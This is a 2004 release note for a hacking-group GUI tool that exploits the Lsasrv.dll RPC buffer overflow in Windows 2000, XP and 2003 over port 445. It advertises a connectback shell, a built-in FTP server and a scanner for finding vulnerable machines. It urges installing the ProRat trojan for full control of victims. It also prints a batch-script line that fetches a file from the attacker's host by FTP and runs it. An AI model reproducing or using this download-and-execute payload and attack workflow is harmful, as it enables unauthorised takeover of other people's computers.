Easy Lsasrv.dll RPC buffer overflow remote exploit GUI by ATmaCA
Bug discoveried by eEye Digital Security (http://www.eeye.com)
Credit to houseofdabus
Compilied  15/06/04
Copyright � 2004 ProGroup Software, Inc.
Coded By ATmaCA
E-Mail:support@prohack.net
Web:http://www.prohack.net

Description:
Basically this is a program to extend the functionality of the newly discovered Lsasrv.dll RPC
Buffer overflow exploit affecting all 2k/xp/2003 systems. 

Features include a built in FTP server,socket for listening connectback shell,batch script for upload.
you can easily upload files to computers you connect to,and a RetinaScanner to find affected Pcs without to work the
core of the exploit through command prompt.
I included in the zip file retina audit scanner.

Recomented u to upload ProRat Special Edition server to target pc (this will give you absolutely full control of target pc) 
And When u disconnect ,remote pc will not crash =)



Technical details:
Atack port:445
Using connectback shell (listenin local port 9110)
Using ftp server on port (21)
Default target [0x01004600]: WinXP Professional [universal] lsass.exe (jmp esp addr)
BatchScript="echo off&echo open "+LocalIp+" 21>>cmd.ftp&echo anonymous>>cmd.ftp&echo user&echo bin>>cmd.ftp&echo get "+LocalFile+">>cmd.ftp&echo bye>>cmd.ftp&echo on&ftp -s:cmd.ftp&"+LocalFile+"&echo off&del cmd.ftp&echo on\r\n";

XP Patch:
http://www.microsoft.com/downloads/details.aspx?FamilyID=3549ea9e-da3f-43b9-a4f1-af243b6168f3&displaylang=en

Sorry for my bad english ...